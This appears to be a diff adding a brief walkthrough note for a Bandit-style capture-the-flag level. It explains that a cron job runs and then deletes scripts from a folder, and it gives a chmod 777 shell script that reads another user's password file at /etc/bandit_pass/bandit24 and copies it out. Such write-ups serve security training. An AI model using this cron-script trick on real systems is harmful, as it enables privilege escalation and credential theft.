@@ -1,0 +1,5 @@
+This one is a bit trickier. you can follow the cron trail and find a folder that is always executed then deleted. So simply make the following sh file and make sure it is executable using chmod 777
+
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> bandit24pass
